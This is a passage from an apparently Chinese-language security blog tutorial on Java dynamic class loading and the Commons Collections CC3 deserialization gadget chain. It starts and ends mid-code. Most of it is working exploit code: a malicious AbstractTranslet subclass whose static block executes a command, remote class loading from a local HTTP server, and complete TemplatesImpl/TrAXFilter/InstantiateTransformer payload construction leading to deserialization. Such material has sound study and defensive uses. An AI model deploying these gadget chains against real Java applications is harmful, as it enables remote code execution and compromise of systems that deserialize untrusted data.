class="keyword">class</span> <span class="title class_">runtime</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过python部署编译过的runtime.class文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>加载runtime类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:9999/&quot;</span>)&#125;;</span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;runtime&quot;</span>);</span><br><span class="line">clazz.newInstance();</span><br></pre></td></tr></table></figure><p><img src="image-20230324170705619.png" alt="image-20230324170705619"></p><p>作为攻击者，如果我们能控制url里的内容，则可以利用远程加载的方式执行任意代码</p><h2 id="defineClass">defineClass</h2><p>defineClass可以直接将字节码转换成java类对象，通过反射调用defineClass执行恶意加载的类，如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">defineclassmethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineclassmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));<span class="comment">//这一段code的内容是可以直接写的，这里为了方便直接从本地加载</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (Class) defineclassmethod.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;runtime&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">clazz.newInstance();<span class="comment">//defineClass得到的类是不会初始化的,需要实例化才能触发静态代码块</span></span><br></pre></td></tr></table></figure><p><img src="image-20230324183911787.png" alt="image-20230324183911787"></p><p>就是说通过Classload#defineClass()也可以命令执行，但defineClass一般很难直接调用</p><p>我们需要找一条能用的利用链</p><p>首先可以看到<code>TemplatesImpl.TransletClassLoader.defineClass方法</code>调用了defineClass</p><p><img src="image-20230324184836969.png" alt="image-20230324184836969"></p><p>defineClass方法又被<code>TemplatesImpl.defineTransletClasses方法</code>调用</p><p><img src="image-20230324185034088.png" alt="image-20230324185034088"></p><p>继续下去，最终找到一条利用链</p><p>TemplatesImpl#getOutputProperties</p><p>TemplatesImpl#newTransformer</p><p>TemplatesImpl#getTransletInstance（恶意类在这个方法里被实例化）</p><p>TemplatesImpl#defineTransletClasses</p><p>TemplatesImpl.TransletClassLoader#defineClass</p><p>Classload#defineClass()</p><p>其中TemplatesImpl#getOutputProperties和TemplatesImpl#newTransformer都是public方法，所以能被直接调用，但几个点需要注意：</p><p>在getTransletInstance方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//不能返回，所以_name!=null</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();<span class="comment">//要调用，所以_class == null</span></span><br></pre></td></tr></table></figure><p>在defineTransletClasses中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<span class="comment">//这里_tfactory得有值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);<span class="comment">//这里调用了defineClass，_bytecodes[i]就是要传的参数</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<span class="comment">//这里会判断构造出来的类对象的父类是不是AbstractTranslet类，所以我们要修改所构造的恶意类继承AbstractTranslet类</span></span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最终的恶意类构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令执行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p><img src="image-20230324194529617.png" alt="image-20230324194529617"></p><h1 id="CC3链">CC3链</h1><p>也就是说我们现在只需要调用templates.newTransformer()就可以执行命令了，所以我们在cc6的基础上做一些修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br></pre></td></tr></table></figure><p>后面的步骤还是和cc6一样</p><p>故构建的测试代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//断开利用链</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="comment">//TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;13&quot;);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射恢复利用链</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line"></span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>反序列化利用成功</p><p><img src="image-20230324202313954.png" alt="image-20230324202313954"></p><p>实际上只是通过类的动态加载替换掉了Runtime.getRuntime().exec()，在Runtime类用不了的时候就可以使用这种方法。</p><p>但如果InvokerTransformer也不能使用的话，其实还有另一种方法。</p><p>我们可以找找看还有哪个类调用了TemplatesImpl#newTransformer方法</p><p><img src="image-20230324203839412.png" alt="image-20230324203839412"></p><p>可以发现TrAXFilter类的构造方法调用了newTransformer，但TrAXFilter类没有实现序列化接口，所以只能通过类的getConstructor方法实例化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//这里调用了newTransformer</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>InstantiateTransformer类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;<span class="comment">//这里要等于new Class[]&#123;Templates.class&#125;</span></span><br><span class="line">    iArgs = args;<span class="comment">//要等于new Object[]&#123;templates&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//要传入TrAXFilter.class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);<span class="comment">//获取类的构造器</span></span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);<span class="comment">//实例化对象</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以通过以下代码即可实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);<span class="comment">//templates是之前创建的TemplatesImpl实例化对象</span></span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p><img src="image-20230324213518326.png" alt="image-20230324213518326"></p><p>通过这种方法我们就可以不使用InvokerTransformer类来命令执行了</p><p>命令执行代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">Transformer[] Transformers = 